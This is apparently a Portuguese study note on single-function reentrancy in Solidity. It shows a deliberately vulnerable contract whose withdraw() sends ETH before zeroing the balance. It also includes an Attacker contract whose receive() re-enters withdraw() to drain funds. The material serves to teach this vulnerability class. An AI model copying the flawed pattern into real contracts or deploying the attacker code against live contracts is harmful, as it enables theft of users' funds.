+++
title = "Reentrada de Função Única (Solidity)"
author = ["Gabriel Rosa"]
date = 2023-09-07
tags = ["reentrancy"]
draft = false
+++

tags
: [Reentrada (SWC-107)]({{< relref "reentrada_swc_107.md" >}})

source
: [Single-Function Reentrancy (SCSFG)](https://scsfg.io/hackers/reentrancy/#single-function-reentrancy)

É o tipo de reentrada que afeta o contexto de uma única função.


## Vulnerabilidade {#vulnerabilidade}

No código abaixo, a função de saque irá pegar o saldo disponível do chamador da função e transferir para ele esse valor caso o contrato tenha ETH suficiente para isso. Se a transferência foi bem-sucedida, ele irá atualizar o saldo disponível do chamador da função.

O problema com esse código é: se o chamador da função for um contrato, ele poderá usar `receive()` para reentrar a função `withdraw()` do contrato antes que ela termine de executar e sacar mais até secar o ETH do contrato. Isso é possível porque o saldo disponível é atualizado só depois da transferência.

```solidity
contract Vulnerable {
    mapping(address => uint256) public balances;

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }
}
```


## Exploitando {#exploitando}

```solidity
contract Attacker {
    Vulnerable public vulnerableContract;
    uint256 public reentranceCount;

    constructor(address vulnerableContractAddress) {
        vulnerableContract = Vulnerable(vulnerableContractAddress);
    }

    function attack() public {
        reentranceCount = 0;
        vulnerableContract.withdraw();
    }

    receive() external payable {
        if (reentranceCount < 5) {
            vulnerableContract.withdraw();
            reentranceCount++;
        }
    }
}
```
